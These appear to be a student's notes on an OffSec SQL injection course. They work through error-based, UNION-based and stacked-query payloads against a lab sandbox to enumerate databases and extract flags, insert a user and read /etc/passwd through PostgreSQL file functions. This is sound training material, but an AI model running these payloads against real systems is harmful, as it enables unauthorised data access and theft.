This Learning Unit covers the following Learning Objectives:

1. Understand how to build and use Error-based payloads
2. Understand how to build and use Union-based payloads
3. Understand how to use Stacked Queries
4. Understand how to use SQL injection to read and write files
5. Understand the basics of remote code execution in Microsoft SQL Server

Once we have identified a parameter or input field that can trigger a SQL injection, our next step is to start crafting a payload to exploit the vulnerability. Depending on the application and its environment, we may be able to exfiltrate data, bypass application controls, modify data, or write files to the underlying server.

We may encounter situations in which we are able to inject into an SQL query but we are not able to obtain or inspect the results of the query. This is often referred to asÂ _blind SQL injection_.[1](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/exploiting-sql-injection-31506#fn-local_id_36-1)Â We could use various techniques, such a forcing the database to wait or sleep as part of the query, to indirectly exfiltrate data. However, these techniques are more advanced and will not be covered in this Learning Module.

Next, we'll review several SQL injection exploit techniques, starting with error-based enumeration.

(OWASP Foundation, 2021),Â [https://owasp.org/www-community/attacks/Blind_SQL_Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/exploiting-sql-injection-31506#fnref-local_id_36-1)

------------
#### 
8.3.1. Error-based Payloads (HARD)

As we begin working towards exploitation, we'll use any error messages we uncover to learn more about the database, beginning with the database software version. Once we know this, we can refine our payloads and determine what we can do with the SQL injection vulnerability.

If a web application discloses simple database error messages, we can inspect those messages for keywords or identifiers that leak details about the database software. For example, Oracle error messages often include an identifier that starts with "ORA".

If an application returns verbose errors, we may be able to extract data from partial query results.

One way to do this is to force erroneous data type conversions. For example, most databases can convert a date field to a string (or varchar) field, but converting a string to a date will likely cause an error if the string value does not match the expected date format.

Some databases will include the value that caused a conversion error in an error message. We can demonstrate this with PostgreSQL and SQL Server by selecting the database version and converting it to an integer.

Let's try out this technique againstÂ `http://sql-sandbox/intro`. We'll use theÂ _cast()_[1](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/exploiting-sql-injection-31506#fn-local_id_68-1)Â function to do the conversion. We'll enterÂ `cast(@@version as integer)`Â in the "Menu Item ID" field and select "SQL Server" as the database. For theÂ _cast()_Â function, we're going to pass in the column or field we want to convert followed by "as" and the data type we want to convert the field to. Finally, we'll clickÂ _Submit Query_.

Error-based SQL injection in Microsoft SQL Server
![[Pasted image 20240820161552.png]]

The server responded with an error message that included the database version. This technique will also work on PostgreSQL databases, replacing "`@@version`" with "`version()`" to match the database-specific syntax.

MySQL handles theÂ _cast()_Â function differently. The function will return a value, includingÂ _null_,[2](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fn-local_id_68-2)Â instead of throwing an error. However, MySQL has two XML functions,[3](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fn-local_id_68-3)Â _ExtractValue()_Â andÂ _UpdateXML()_, that will return the value that causes an error.

Let's try using the MySQLÂ _ExtractValue()_[4](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fn-local_id_68-4)Â function. According to its documentation, it takes two parameters: an XML fragment and anÂ _XPath_[5](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fn-local_id_68-5)Â expression. We don't need to be XPath experts to use this function. In fact, we will intentionally misuse it by submitting an invalid XPath expression. We'll use the following payload.

A sample extractvalue() call for MySQL error-based SQL injection
```sql
extractvalue('',concat('>',version()))
```

In this payload, we call theÂ _extractvalue()_Â function and pass in a blank string as the first parameter (the XML fragment). For the second parameter, we use theÂ _concat()_Â function to concatenate the greater-than symbol (>) andÂ _version()_. We can use many different values for the first value in theÂ _concat()_Â function as long as the resulting value is not a valid XPath expression. We want to avoid values that start with a forward slash (/), a period (.), the at character (@), or a completely alphanumeric string since these values would start a valid XPath expression. We are using the greater-than symbol (>) because it is a delimiter in XML and cannot be part of a valid XML node.

Let's enter our payload in the "Menu Item ID" field, select "MySQL" in the Database field, and clickÂ _Submit Query_.

Error-based SQL injection using ExtractValue() in MySQL
![[Pasted image 20240820161805.png]]

The server response includes an XPATH syntax error with the MySQL database version.

In a similar way, we can leverage XML functions in Oracle databases. However, the syntax is the most complicated we've used so far. Although we won't delve too deeply into the details of this vector, we'll walk through this useful payload.

For demonstration purposes, this payload is formatted with line breaks and numbers.

```
01  to_char(
02    dbms_xmlgen.getxml(
03      'select "'||
04        (select substr(banner,0,30) from v$version where rownum=1)
05      ||'" from sys.dual'
06    )
07  ) 
```

We'll begin with line 4 since it is a sub-query that will be executed first. This sub-query is selecting the first 30 characters (with theÂ _substr()_Â function) from theÂ _banner_Â column in the first row of theÂ _v$version_Â table. Next, we use the double pipe operator (||) on lines 3 and 5 to concatenate the result of the subquery into a new select statement.

**PostgreSQL also uses double pipes for string concatenation.**

On line 4, we've included theÂ _substr()_Â function because Oracle limits column names to 30 characters or less. When this line is executed, the result is a value like "Oracle Database 11g Express Ed". Once concatenated with lines 3 and 5, the result will be 'select "Oracle Database 11g Express Ed" from sys.dual'.

Line 2 calls theÂ _dbms_xmlgen.getxml()_[6](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fn-local_id_68-6)Â function. This function accepts an SQL query, executes it, and converts it to XML. The results are passed toÂ _to_char()_, which converts the results to a character string.

In this case,Â _dbms_xmlgen.getxml()_Â will run the query 'select "Oracle Database 11g Express Ed" from sys.dual', which contains an invalid column name.

Let's try it out onÂ /intro. We'll enterÂ `to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))`Â in the Menu Item ID field, select Oracle as the database, and clickÂ _Submit Query_.

![[Pasted image 20240820162325.png]]

The server responded with an error message that includes the substring as an invalid identifier. By adjusting the inner query and iterating the start and stop value of theÂ _substr()_Â function, we should be able to extract any value from the Oracle database.

There are many more database-specific functions and error-based SQL injection vectors. For more information, consult some of the many[7](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fn-local_id_68-7)Â Internet-based resources[8](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fn-local_id_68-8)Â available on these Learning Modules.

Prepare for the next exercises by recreating the error-based payloads in this section for each database type in the SQL Sandbox application.

Go toÂ `http://sql-sandbox/exploit/error`Â for the following exercises.

(Microsoft, 2021),Â [https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver15](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver15)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fnref-local_id_68-1)
(Wikipedia, 2021),Â [https://en.wikipedia.org/wiki/Null_(SQL)](https://en.wikipedia.org/wiki/Null_(SQL))Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fnref-local_id_68-2)
(Oracle, 2021),Â [https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html](https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fnref-local_id_68-3)
(Oracle, 2021),Â [https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_extractvalue](https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_extractvalue)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fnref-local_id_68-4)
(Wikipedia, 2021),Â [https://en.wikipedia.org/wiki/XPath](https://en.wikipedia.org/wiki/XPath)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fnref-local_id_68-5)
(Oracle, 2016),Â [https://docs.oracle.com/database/121/ARPLS/d_xmlgen.htm#ARPLS69856](https://docs.oracle.com/database/121/ARPLS/d_xmlgen.htm#ARPLS69856)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fnref-local_id_68-6)
(Swissky, et al, 2021)Â [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fnref-local_id_68-7)
(NetSPI, 2019),Â [https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql](https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/error-based-payloads-31032#fnref-local_id_68-8)

##### Labs

Prepare for the next exercises by recreating the error-based payloads in this section for each database type in the SQL Sandbox application.
1. `SQL Server`
2. `OS{errorBasedSQLi}`
![[Pasted image 20240820211550.png]]
SQL Payloads:

**SQL Server == MSSQL**
```sql
cast(@@version as integer)
```
POSTgres
```sql
cast(version() as integer)
```
A sample extractvalue() call for MySQL error-based SQL injection
```sql
extractvalue('',concat('>',version()))
```
Oracle
```sql
to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
```

SQL Server testing
`cast(@@version as integer)`
![[Pasted image 20240820162840.png]]
MySQL? `cast(@@version as integer)'`
![[Pasted image 20240820163031.png]]
If we look at the `BURP` request there are `4` input variables that exist - the `instock` field
- from this error we know that it is `MSSQL` SQL SERVER
![[Pasted image 20240820174424.png]]
send to `repeater`
```html
inStock=1&name=cast%28%40%40version+as+integer%29%27&sort=id&order=asc
```
we should fuzz the `inStock` parameter
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[20Aug2024 20:13:28]-[/home/kali]                                                                                                                                            
â””â”€# wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "inStock=FUZZ&name=cast%28%40%40version+as+integer%29%27&sort=id&order=asc" -u http://sql-sandbox/exploit/api/error      
********************************************************                                                                                         
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                           
********************************************************                                                                                                           
Target: http://sql-sandbox/exploit/api/error                                                                                                          
Total requests: 125                                                                                                                                                
=====================================================================                                                                                              
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================                                                                                            
000000003:   500        0 L      15 W       139 Ch      "#"                                                                                                        
000000007:   500        0 L      15 W       139 Ch      "--';"                                                                                                     
000000015:   500        0 L      15 W       141 Ch      "\x3D%20\x27"                                                                                              
000000031:   500        0 L      17 W       152 Ch      "or 0=0 #"                                                                                                 
000000039:   500        0 L      15 W       139 Ch      "' or 1=1 or ''='"                                                                                         
```
Didnt get a `burp` response that was difference than the one before.

With `SQL SERVER` we are able to query all the databases with the sql query  learned from [[7.3 - 7.3.1 Enumerating Microsoft SQL Server Databases]]

```sql
SELECT name FROM sys.databases
```
what we learned with `ERROR` based payloads is that with `SQL SERVER MSSQL` you want to `PREPEND` your query with the `CAST` function.
```sql
CAST ((SELECT name FROM sys.databases) as integer)
```
In the new request plug in the `SQL` above into the `inStock` variable
![[Pasted image 20240820175729.png]]
Hit `CTRL + U` while highlighting or Highlight, and right click to change to `URL-Encoding` to ensure proper processing
![[Pasted image 20240820180231.png]]
Now once we submit it, we get an error saying that we cannot process more than `1` value at a time - the fix, is to request a database `1` row at a time
![[Pasted image 20240820180712.png]]
in the `SQL Console` we can see the query without `CAST` which shows multiple databases, we need to get it to only show 1 at a time
![[Pasted image 20240820181501.png]]

```sql
CAST ((SELECT name FROM sys.databases ORDER by name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```

`FETCH NEXT 1 ROWS ONLY` = Getting SQL SERVER to show only 1 row at a time
`OFFSET 0 ROWS` = Saying to start at the very 1st row
`CAST` because of error based `SQL INJECTION` with SQL Server

Now place in the query, `CTRL + U` to `URL Encode` and send the request
![[Pasted image 20240820182051.png]]
make sure the `name=` variable is empty and we get the `1st` database named `app`
![[Pasted image 20240820182425.png]]
Now just increase the `OFFSET` to get the next row and eventually the `OFFSET` will overflow and cause an error
```sql
CAST ((SELECT name FROM sys.databases ORDER by name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
copy the `SQL` string into the `inStock` variable and change into `url-encoding` with `ctrl +u`
- exercise database
![[Pasted image 20240820182648.png]]
```sql
CAST ((SELECT name FROM sys.databases ORDER by name OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
master database
![[Pasted image 20240820183332.png]]
```sql
CAST ((SELECT name FROM sys.databases ORDER by name OFFSET 3 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
model database
![[Pasted image 20240820183422.png]]
```sql
CAST ((SELECT name FROM sys.databases ORDER by name OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
msdb database
![[Pasted image 20240820183500.png]]
```sql
CAST ((SELECT name FROM sys.databases ORDER by name OFFSET 5 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
sqlmap database
![[Pasted image 20240820183717.png]]
Well we know that the flag is in `exercise` db, so now we have the database now we just have to enumerate the schema with this query below to show one `SCHEMA`
 at a time

**Schemas are essentialy folders, holding data** - a way to segrate files logically.
```sql
CAST ((SELECT SCHEMA_NAME from exercise.information_schema.SCHEMATA ORDER BY SCHEMA_NAME OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
insert `SQL` abnd `CTRL + U` to url encode
![[Pasted image 20240820195738.png]]
we get the `schema` for `db_accessadmin`
![[Pasted image 20240820195923.png]]
repeat by iterating +1 in `OFFSET`
```sql
CAST((SELECT SCHEMA_NAME from exercise.information_schema.SCHEMATA ORDER BY SCHEMA_NAME OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
`db_backupoperator` schema found
![[Pasted image 20240820201827.png]]
repeat by iterating +1 in `OFFSET`
```sql
CAST((SELECT SCHEMA_NAME from exercise.information_schema.SCHEMATA ORDER BY SCHEMA_NAME OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
![[Pasted image 20240820202129.png]]
```sql
CAST((SELECT SCHEMA_NAME from exercise.information_schema.SCHEMATA ORDER BY SCHEMA_NAME OFFSET 9 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
`dbo` schema found which is `SYSTEM` owned after `9` rows searched
![[Pasted image 20240820202303.png]]
Now we need the table names
from the `exercise` database, with `information_schema.tables` schema and `TABLE_SCHEMA` =`'dbo'`

```sql
SELECT TABLE_NAME from exercise.information_schema.tables where TABLE_SCHEMA='dbo'
```
Upon testing this query in the `SQL Console` we see two table names `products, and secrets`
![[Pasted image 20240820204400.png]]
so now to run inside `CAST` - changed `ORDER by SCHEMA_NAME` to `ORDER by NAME` to get it to work.
```sql
CAST((SELECT TABLE_NAME from exercise.information_schema.tables where TABLE_SCHEMA='dbo' ORDER BY NAME OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
can see the `products` table
![[Pasted image 20240820204930.png]]
Changing the `OFFSET` by 1 
```sql
CAST((SELECT TABLE_NAME from exercise.information_schema.tables where TABLE_SCHEMA='dbo' ORDER BY NAME OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)
```
can see the `secrets` table
![[Pasted image 20240820205046.png]]

What we know so far:

Database name = exercise
Schema name = dbo
Table name = secrets

now to get the `columns` we need to build the query with the `database` name and the `table` name

```sql
select * from exercise.information_schema.columns where table_name ='secrets'
OR
select * from exercise.information_schema.columns where table_name ='secrets' and TABLE_SCHEMA='dbo'
```
Testing in `SQL Console` to ensure it works
![[Pasted image 20240820205518.png]]
When it comes to `MSSQL` we need to be coomplete, so in order to grab the flag we need to use the `SQL` query below 

```sql
cast((select flag from exercise.dbo.secrets) as integer)
```

select the `flag` from column
using the `exercise` database
the `dbo` schema
and the `table` secrets

`Error Based SQL` is very slow and methodical, you have to find the database - schema - table - and ultimately the `flag` and each language is different
`OS{errorBasedSQLi}`
![[Pasted image 20240820211227.png]]

-----------
#### 8.3.2 Union Based Payloads (HARD)

In order to extract data from the database, we need to inject SQL code that will return the data we're interested in. One way we can do this is with theÂ _UNION_[1](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/union-based-payloads-31045#fn-local_id_245-1)Â keyword, which instructs the database to combine and return the results of two queries. By default, most database software will remove duplicate results when a UNION is used. We can avoid this behavior by specifying `UNION ALL` to include all rows without de-duplication.

**When we use a UNION, most database software requires all queries to return the same number of columns and the same data types for corresponding columns. In other words, if the first column of the first query is an integer data type, the first column of the second query must also be an integer.**

If we are not sure how many columns there are in the query we're injecting into, we can start our UNION payload by selecting a single column. If the payload fails, we can add a new column and resend the payload, repeating the process until we no longer receive an error. For most databases, we can select "null" for each column, without needing to specify a table. However, with Oracle databases we need to select from theÂ _dual_Â table.

We can potentially target any table in a database with a UNION statement as long as the database user account executing the statement has read access to the table. Our exact targets will depend on the application and database we are actively targeting, but usually any tables that hold authentication information, such as usernames, passwords, password reset tokens, or active session identifiers, are useful targets.

Let's try writing a UNION query in our SQL console atÂ `http://sql-sandbox/sqlconsole`. We'll start with a basic SELECT statement, and append the UNION keyword followed by a second SELECT statement. We'll target theÂ _users_Â table. However, theÂ _users_Â table has only three columns. We could omit one column from theÂ _menu_Â table but normally we wouldn't have that much control over the SQL statement we are injecting into. Instead, we can select a static value.

We'll enterÂ `SELECT id, name, description, price FROM menu UNION ALL SELECT id, username, password, 1 FROM users;`Â as our query, select `"MySQL"` as the database, and clickÂ _Submit Query_.

Using a UNION to combine two SELECT statements
![[Pasted image 20240820212911.png]]

The database returned the results of our UNION query and the application joined the results. When we exploit a SQL injection vulnerability by injecting a UNION, we want to make sure the data we're trying to extract will be rendered by the application in a way that we can access. Not all applications will display every column or field of data.

Next, let's try using a UNION-based payload in a SQL injection attack againstÂ `http://sql-sandbox/intro`. From our previous tests, we know we're injecting into the WHERE clause. We'll enter a value to complete the WHERE clause and then add our UNION payload to read from theÂ _users_Â table again. We'll enterÂ `0 UNION ALL SELECT id, username, password, 0 from users`Â in the Menu Item ID field, select "MySQL" as the database, and clickÂ _Submit Query_.

Executing a UNION-based SQL injection payload
![[Pasted image 20240820213413.png]]
Our payload was successful and we have gained access to data from theÂ _users_Â table. In this example, the password is in cleartext, but many databases will instead store passwords asÂ _hashes_[2](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/union-based-payloads-31045#fn-local_id_245-2)Â to prevent hackers from obtaining the cleartext values of passwords.

Let's review what SQL statement the application executed here, including our payload.

SQL statement executed with our union-based payload
```sql
SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users
```

We started our payload with a 0 to complete the comparison in the existing WHERE clause. We followed that with the UNION ALL keywords before including an additional SELECT statement. The query we are injecting into has four columns so we needed to match the column by adding a fourth column with a static value (0) that matched the data type of the corresponding column (price).

While error-based payloads are generally database-specific, the UNION-based approach works for most database software as long as we know what tables to target. UNION-based payloads are an excellent technique to enumerate the structure and contents of a database since they return data that is rendered by the application.

Prepare for the next exercises by recreating the union-based payloads in this section for each database type in the SQL Sandbox application.

Go toÂ `http://sql-sandbox/exploit/union`Â for the following exercises.

(Microsoft, 2021),Â [https://docs.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver15](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver15)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/union-based-payloads-31045#fnref-local_id_245-1)
(CheatSheet Series Team, 2021),Â [https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/union-based-payloads-31045#fnref-local_id_245-2)


##### Labs
1. `MySQL`
![[Pasted image 20240821190630.png]]

[SQL injection UNION attacks | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/sql-injection/union-attacks)
This explains it `UNION` SQL Injection well.
![[Pasted image 20240820222306.png]]
So essentially by entering nothing in the original query, it spits out a query results that are being utilized.
![[Pasted image 20240820222446.png]]
##### WHAT WE KNOW:
If we enter `nothing` into the `NAME` field we get a rsponse from an `SQL` Query
So we know that there are `4` columns being utilized
We know that in order for our `UNION` query to work we have to also have `4` columns, being utilized thanks to the rule above.
The data types must also match

this query utilized `string'))` to close out the query that is being utilized without submitting an actual `name` variable
- the `UNION SELECT 1` is showing a `1` in the `id` field
- `version()` is showing `5.7.35` in the name field which is the version of the `SQL` server - if you google `SQL` and `5.7.35` `MYSQL` pops up
- `user()` shows the user, null shows null
```sql
#works
test'))UNION SELECT 1,version(),user(),null--+
```

![[Pasted image 20240821190411.png]]
2. `OS{secretUNION-basedFlag}` 
![[Pasted image 20240821191151.png]]
chatgpt generated that gets secret table
```sql
test')) UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database() --+
```

Breakdown of the chatgpt generated payload:
- **`'`**: Closes the current string or query parameter.
- **`UNION SELECT`**: Combines results from your query with the results of the following SELECT statement.
- **`table_name`**: Retrieves the name of the table.
- **`NULL, NULL, NULL`**: Fills the remaining columns with `NULL` values.
- **`FROM information_schema.tables`**: Specifies the table that contains metadata about other tables.
- **`WHERE table_schema = database()`**: Filters to show tables in the current database.
- **`--+`**: Comments out the rest of the original query to prevent syntax errors.
```sql
test')) UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database() --+

```
Now we have the table name secrets
![[Pasted image 20240821121207.png]]
- utilized [[7.2 - 7.2.1 Enumerating MySQL Databases]] to build this query by trouble shooting
```sql
test')) UNION SELECT column_name, NULL, NULL, NULL from information_schema.columns where table_schema = database() and table_name = 'secrets'  --+
```
Explanation:
**`test'))`**:
- This part closes the original queryâ€™s condition (e.g., `WHERE column = 'test'`).
- The first `)` closes the string literal (`'test'`), and the second `)` closes the initial queryâ€™s `WHERE` clause or any parenthesis in the SQL query.

**`UNION SELECT column_name, NULL, NULL, NULL`**:
- **`UNION`**: The `UNION` operator is used to combine the result of two `SELECT` statements. Both queries must return the same number of columns.
- **`SELECT column_name, NULL, NULL, NULL`**: This is the injected query. It selects the column names from the database and fills the remaining columns with `NULL` to match the number of columns returned by the original query.
- **`column_name`**: This is the column of interest, which comes from the `information_schema.columns` table.
- **`NULL, NULL, NULL`**: These are placeholders for other columns that need to match the number of columns in the original query's `SELECT` statement.

**`from information_schema.columns`**:
- This part of the query is selecting data from the `information_schema.columns` table, which is a system table in many relational databases that contains metadata about the columns in the database.

**`where table_schema = database()`**:
- **`table_schema = database()`**: This condition filters the results to only include columns from the current database (i.e., the database returned by the `database()` function).
- **`and table_name = 'secrets'`**:
- **`table_name = 'secrets'`**: This further filters the results to only include columns that belong to a specific table named `'secrets'`.
- **`--+`**:
- This sequence is a SQL comment (`--`) followed by a `+`. Everything after the `--+` is treated as a comment and ignored by the SQL server. This effectively neutralizes any trailing part of the original query that could cause a syntax error.ry is selecting data from the `information_schema.columns` table, which is a system table in many relational databases that contains metadata about the columns in the database.

this returns the `flag` column inside the `secrets` table inside the `database()`
![[Pasted image 20240821122744.png]]
to grab the flag once you know the location of the `flag` and the table being utilized
```sql
test')) UNION SELECT flag, NULL, NULL, NULL from secrets --+
```
![[Pasted image 20240821185452.png]]

-------------------
#### 8.3.3 Stacked Queries

Some database software can execute more than one query at a time. These are known asÂ _stacked queries_. While conceptually similar to a UNION, stacked queries are individual queries submitted at the same time and executed sequentially. Not all databases and programming language APIs support stacked queries and those that do might handle them differently. For instance, some might execute only the first query. Others might only execute the last query provided.

We must also account for how the application handles multiple results. If an application uses the data retrieved from a database to create or populate an object in memory, stacked queries could cause application errors unless the column names match expected values.

We can try stacked queries in our SQL sandbox application atÂ `http://sql-sandbox/intro`. We'll enterÂ `10; select * from users`Â in the Menu Item ID field, select "PostgreSQL" as the database, and clickÂ _Submit Query_.

![[Pasted image 20240821191530.png]]

The server responded with only the contents of theÂ _users_Â table. From a black box perspective, we cannot tell if the database executed the first query, but it doesn't matter for our purposes. We were able to inject a second query and view the results. However, we should note that this technique's usefulness depends on how the application handles results. If the application validated the column names in the results, for example, this approach could cause an application error.

Another way we can potentially leverage stacked queries is to add, update, or delete data in a database. These types of queries do not return results when they are executed so we will need another way to determine if the stacked query was executed.

Let's try inserting a new user. INSERT statements use the following syntax:

SQL syntax for an INSERT statement
```sql
INSERT INTO <table name>(<comma separated list of columns>) values (<comma separated list of values>);
```

Since we need to know the name of the table and its columns to insert data, proper enumeration of the target database is very important.

Let's try using stacked queries in our sandbox app atÂ `http://sql-sandbox/intro`. We'll enterÂ `10; insert into users(id, username, password) values (1001,'hax','hax');`Â in the Menu Item ID field, select `PostgreSQL`as the database, and clickÂ _Submit Query_.


Results of submitting a stacked query to insert data
![[Pasted image 20240821200045.png]]
The application did not return any rows of data. Since the second query we stacked after the original query does not return any data, this may mean our INSERT statement was executed successfully. We can use the SQL Console in the sandbox application to directly query theÂ _users_Â table to determine if our row was added.


`SELECT * FROM users;` in `SQL Console`
Querying the users table to verify our payload worked
![[Pasted image 20240821200234.png]]

Excellent. The application executed the stacked query and added the new user record. We could have used another stacked query or a UNION-based payload to verify the record was added as well. While we used PostgreSQL for demonstration purposes, Microsoft SQL Server also supports stacked queries.

Prepare for the next exercises by recreating the stacked query payloads in this section for PostgreSQL and Microsoft SQL Server databases in the SQL Sandbox application.


Browse toÂ `http://sql-sandbox/exploit/stacked`Â for the following exercises.

##### Labs

1. `POSTGRESQL`
![[Pasted image 20240821214245.png]]
Starting point - entering nothing shows 3 columns
![[Pasted image 20240821201552.png]]
testing
```sql
lamp;select+version();
lamp';select+version();
lamp;select+version();--+-
lamp');select+version();
lamp'));select+version();#
```
modifying the `name` parameter to lamp only shows the `lamp Shade` name
![[Pasted image 20240821210342.png]]
leaving it empty shows everything
![[Pasted image 20240821210441.png]]
in order to get the database `version` we have to inject into the `order` field, the `name` variable is not able to be injected into.
- Always test all variable fields.

```sql
;select+version();--+-
```
- the `;` completes the 1st query
- `select+version();--+-` selects the version number and comments out the rest.
![[Pasted image 20240821214051.png]]

2. `OS{stackUpThoseQueries}` 
![[Pasted image 20240821220135.png]]
finding `current user` in `POSTGRESQL`
```sql
;select current_user;--+-
```
![[Pasted image 20240821214631.png]]
finding `current database` in `POSTGRESQL`
```sql
;select datname from pg_database;--+-
```
![[Pasted image 20240821215043.png]]
Grabbing the `information_schema.tables` from the `exercise` database that is `public` in `POSTGRESQL`
```sql
;select table_name from exercise.information_schema.tables where table_schema = 'public';
```
![[Pasted image 20240821215426.png]]
selecting the `column_name` & `data_type` in the `exercise` database from the `flags` table in `POSTGRESQL` to get the `flag` name`
```sql
;select column_name, data_type from exercise.information_schema.columns where table_name = 'flags';
```
![[Pasted image 20240821215814.png]]
pulling the `flag` from the `exercise` public database from the `flags` table
```sql
;select flag from exercise.public.flags;
```
![[Pasted image 20240821220104.png]]

-----------
#### 8.3.4 Reading and Writing Files

Some database software include functions that can read files from, or write files to, the underlying server. We can use these functions to exfiltrate data from the server or write files, such asÂ _webshells_,[1](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/stacked-queries-31046#fn-local_id_230-1)Â which we can use for additional attacks.

PostgreSQL can read and write local files using theÂ _COPY_[2](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/stacked-queries-31046#fn-local_id_230-2)Â keyword. Specifically, we can useÂ _COPY FROM_Â to insert data into a table from a file orÂ _COPY TO_Â to copy data to a file from a table.

In order for COPY_TO to succeed, the user that owns the PostgreSQL server process must have access to the file being read or have write permissions to the directory where the file will be created.

We can practice this in the sandbox application atÂ `http://sql-sandbox/sqlconsole`. We will select "PostgreSQL" as the Database, and enter a payload, which takes advantage of stacked queries, in the "Query" field (shown in Listing 16) below.

The first line of the payload will create a new table namedÂ _tmp_Â with one column named "data". The second line of the payload will copy the contents ofÂ /etc/passwdÂ into theÂ _tmp_Â table. The last line selects all rows and columns fromÂ _tmp_.



SQL payload to create a new table, copy /etc/passwd into the table, and return the table's content
```sql
create table tmp(data text);
copy tmp from '/etc/passwd';
select * from tmp;
```

The results of running our payload to copy /etc/passwd
![[Pasted image 20240821222310.png]]

Our payload worked and we now have access to the contents ofÂ `/etc/passwd`. However, this approach requires that the database user executing the query can create tables and the user running the database service has access toÂ `/etc/passwd`.


delete the table with
```sql
drop table tmp;
```
![[Pasted image 20240821222503.png]]

We can also use the PostgreSQLÂ `pg_read_file()`Â function to read files. UnlikeÂ `COPY FROM`, this function will not insert the results into a table, making it useful in situations in which the database user account we are exploiting cannot create tables.


```sql
SELECT pg_read_file('/etc/passwd')
```
![[Pasted image 20240821222818.png]]

Note that the function returns a single field containing the full contents of the file. If we want to use this function in a union-based attack, we may need to include static values to match the number of columns in the original query.

